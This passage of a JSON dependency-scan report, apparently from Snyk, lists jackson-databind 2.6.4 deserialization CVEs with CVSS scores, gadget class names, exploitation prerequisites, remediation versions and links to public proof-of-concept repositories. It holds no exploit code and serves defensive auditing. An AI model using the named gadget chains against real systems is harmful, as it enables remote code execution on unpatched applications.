            "[,2.9.10.8)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056418",
      "identifiers": {
        "CVE": [
          "CVE-2020-36180"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2022-02-09T15:25:00.471180Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-01-07T16:40:34Z",
      "references": [
        {
          "title": "Al1ex's Poc",
          "url": "https://github.com/Al1ex/CVE-2020-36179"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/3004"
        },
        {
          "title": "Medium Article",
          "url": "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10.8)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2021-01-07T13:11:36.206859Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `org.docx4j.org.apache.xalan.lib.sql.JNDIConnectionPool`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/3003)\n- [Medium Article](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n",
      "disclosureTime": "2021-01-07T13:10:25Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.9.10.8"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056419",
      "identifiers": {
        "CVE": [
          "CVE-2020-36183"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-01-07T16:40:34.630062Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-01-07T16:40:34.627750Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/3003"
        },
        {
          "title": "Medium Article",
          "url": "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10.8)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2021-01-07T13:29:22.463416Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `oadd.org.apache.commons.dbcp.cpdsadapter.DriverAdapterCPDS`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [Al1ex's Poc](https://github.com/Al1ex/CVE-2020-36179)\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/3004)\n- [Medium Article](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n",
      "disclosureTime": "2021-01-07T13:12:59Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.9.10.8"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056420",
      "identifiers": {
        "CVE": [
          "CVE-2020-36179"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-08-12T15:12:08.032670Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-01-07T16:40:34Z",
      "references": [
        {
          "title": "Al1ex's Poc",
          "url": "https://github.com/Al1ex/CVE-2020-36179"
        },
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/3004"
        },
        {
          "title": "Medium Article",
          "url": "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10.8)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2021-01-07T13:30:54.237288Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `org.apache.tomcat.dbcp.dbcp2.cpdsadapter.DriverAdapterCPDS`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/3004)\n- [Medium Article](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n- [PoC](https://github.com/Al1ex/CVE-2020-36179)\n",
      "disclosureTime": "2021-01-07T13:30:00Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.9.10.8"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056421",
      "identifiers": {
        "CVE": [
          "CVE-2020-36182"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2022-02-09T15:25:00.491347Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-01-07T16:40:35Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/3004"
        },
        {
          "title": "Medium Article",
          "url": "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        },
        {
          "title": "PoC",
          "url": "https://github.com/Al1ex/CVE-2020-36179"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10.8)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2021-01-07T13:36:40.536722Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `org.apache.tomcat.dbcp.dbcp2.datasources.SharedPoolDataSource`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2998)\n- [Medium Article](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n",
      "disclosureTime": "2021-01-07T13:34:52Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.9.10.8"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056424",
      "identifiers": {
        "CVE": [
          "CVE-2020-36185"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-01-07T16:40:33.305242Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-01-07T16:40:33.303463Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2998"
        },
        {
          "title": "Medium Article",
          "url": "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        }
      ],
      "semver": {
        "vulnerable": [
          "[,2.9.10.8)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:U/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2021-01-07T13:37:54.679882Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `com.newrelic.agent.deps.ch.qos.logback.core.db.DriverManagerConnectionSource`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2996)\n- [Medium Article](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n",
      "disclosureTime": "2021-01-07T13:37:04Z",
      "exploit": "Unproven",
      "fixedIn": [
        "2.9.10.8"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "functions_new": [
        {
          "functionId": {
            "className": "com.fasterxml.jackson.databind.ObjectMapper",
            "functionName": "enableDefaultTyping"
          },
          "version": [
            "[,2.9.10.8)"
          ]
        }
      ],
      "id": "SNYK-JAVA-COMFASTERXMLJACKSONCORE-1056425",
      "identifiers": {
        "CVE": [
          "CVE-2020-36189"
        ],
        "CWE": [
          "CWE-502"
        ]
      },
      "language": "java",
      "malicious": false,
      "mavenModuleName": {
        "artifactId": "jackson-databind",
        "groupId": "com.fasterxml.jackson.core"
      },
      "modificationTime": "2021-01-07T16:40:33.091140Z",
      "moduleName": "com.fasterxml.jackson.core:jackson-databind",
      "packageManager": "maven",
      "packageName": "com.fasterxml.jackson.core:jackson-databind",
      "patches": [],
      "proprietary": false,
      "publicationTime": "2021-01-07T16:40:33.089230Z",
      "references": [
        {
          "title": "GitHub Issue",
          "url": "https://github.com/FasterXML/jackson-databind/issues/2996"
        },
        {
          "title": "Medium Article",
          "url": "https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062"
        }
      ],
      "semver": {
        "vulnerable": [
          "[, 2.9.10.8)"
        ]
      },
      "severity": "high",
      "socialTrendAlert": false,
      "title": "Deserialization of Untrusted Data",
      "severityWithCritical": "high",
      "from": [
        "com.canh:JavaSpring@1.0-SNAPSHOT",
        "org.springframework.boot:spring-boot-starter-web@1.3.1.RELEASE",
        "com.fasterxml.jackson.core:jackson-databind@2.6.4"
      ],
      "upgradePath": [
        false,
        "org.springframework.boot:spring-boot-starter-web@2.0.0.RELEASE"
      ],
      "isUpgradable": true,
      "isPatchable": false,
      "name": "com.fasterxml.jackson.core:jackson-databind",
      "version": "2.6.4"
    },
    {
      "CVSSv3": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H/E:P/RL:U/RC:C",
      "alternativeIds": [],
      "creationTime": "2021-01-07T13:39:28.531700Z",
      "credit": [
        "Unknown"
      ],
      "cvssScore": 8.1,
      "description": "## Overview\n[com.fasterxml.jackson.core:jackson-databind](https://github.com/FasterXML/jackson-databind) is a library which contains the general-purpose data-binding functionality and tree-model for Jackson Data Processor.\n\nAffected versions of this package are vulnerable to Deserialization of Untrusted Data. The package mishandles the interaction between serialization gadgets and typing, related to `com.newrelic.agent.deps.ch.qos.logback.core.db.JNDIConnectionSource`.\n\n## Details\n\nSerialization is a process of converting an object into a sequence of bytes which can be persisted to a disk or database or can be sent through streams. The reverse process of creating objects from a  sequence of bytes is called deserialization. _Deserialization of untrusted data_ ([CWE-502](https://cwe.mitre.org/data/definitions/502.html)) occurs when an application deserializes untrusted data without sufficiently verifying that the resulting data will be valid, allowing the attacker to control the state or the flow of the execution.\n\n`com.fasterxml.jackson.core:jackson-databind` allows deserialization of JSON input to Java objects. If an application using this dependency has the ability to deserialize a JSON string from an untrusted source, an attacker could leverage this vulnerability to conduct deserialization attacks.\n\nExploitation of unsafe deserialization attacks through `jackson-databind` requires the following prerequisites: \n\n### 1. The target application allowing JSON user input which is processed by jackson-databind\n\nAn application using `jackson-databind` is only vulnerable if a user-provided JSON data is deserialized. \n\n### 2. Polymorphic type handling for properties with nominal type are enabled\n\nPolymorphic type handling refers to the addition of enough type information so that the deserializer can instantiate the appropriate subtype of a value. Use of \"default typing\" is considered dangerous due to the possibility of an untrusted method (gadget) managing to specify a class that is accessible through the class-loader and therefore, exposing a set of methods and/or fields.\n\n### 3. An exploitable gadget class is available for the attacker to leverage \n\nGadget chains are specially crafted method sequences that can be created by an attacker in order to change the flow of code execution. These gadgets are often methods introduced by third-party components which an attacker could utilise in order to attack the target application. Not every gadget out there is supported by `jackson-databind`. The maintainers of `jackson-databind` proactively blacklists possible serialization gadgets in an attempt to ensure that it is not possible for an attacker to chain gadgets during serialization. \n\n### Further reading:\n\n - [On Jackson CVEs: Don’t Panic on Medium](https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n - [NCC Group Jackson Deserialization WhitePaper](https://www.nccgroup.com/globalassets/our-research/us/whitepapers/2018/jackson_deserialization.pdf)\n - [Java Security Best Practices](https://snyk.io/blog/10-java-security-best-practices/)\n  \n## Remediation\nUpgrade `com.fasterxml.jackson.core:jackson-databind` to version 2.9.10.8 or higher.\n## References\n- [GitHub Issue](https://github.com/FasterXML/jackson-databind/issues/2996)\n- [Medium Article](https://cowtowncoder.medium.com/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062)\n- [PoC](https://github.com/Al1ex/CVE-2020-36188)\n",
      "disclosureTime": "2021-01-07T13:38:32Z",
      "exploit": "Proof of Concept",
      "fixedIn": [
        "2.9.10.8"
      ],
      "functions": [
        {
          "functionId": {
            "className": "ObjectMapper",
            "filePath": "com/fasterxml/jackson/databind/ObjectMapper.java",
            "functionName": "enableDefaultTyping"
